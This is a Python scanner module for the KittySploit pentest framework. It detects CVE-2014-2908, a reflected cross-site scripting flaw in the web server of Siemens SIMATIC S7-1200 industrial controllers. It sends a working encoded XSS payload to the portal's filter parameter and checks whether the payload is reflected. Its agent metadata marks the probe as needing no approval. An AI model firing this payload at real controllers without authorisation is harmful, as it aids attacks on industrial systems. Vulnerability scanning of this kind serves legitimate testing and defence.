#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting vulnerability in the integrated web server on Siemens SIMATIC S7-1200 CPU devices 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Siemens SIMATIC S7-1200 CPU - Cross-Site Scripting Detection',
        'description': 'A cross-site scripting vulnerability in the integrated web server on Siemens SIMATIC S7-1200 CPU devices 2.x and 3.x allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'xss', 'siemens', 'edb', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/44687',
            'https://cert-portal.siemens.com/productcert/pdf/ssa-892012.pdf',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-2908',
            'http://ics-cert.us-cert.gov/advisories/ICSA-14-114-02',
            'http://www.siemens.com/innovation/pool/de/forschungsfelder/siemens_security_advisory_ssa-892012.pdf',
        ],
        'cve': 'CVE-2014-2908',
    }

    def run(self):
        r = self.http_request(method="GET", path='/Portal/Portal.mwsl?PriNav=Bgz&filtername=Name&filtervalue=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&Send=Filter', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Siemens SIMATIC S7-1200 CPU - Cross-Site Scripting detected",
                path='/Portal/Portal.mwsl?PriNav=Bgz&filtername=Name&filtervalue=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&Send=Filter',
            )
            return True
        return False

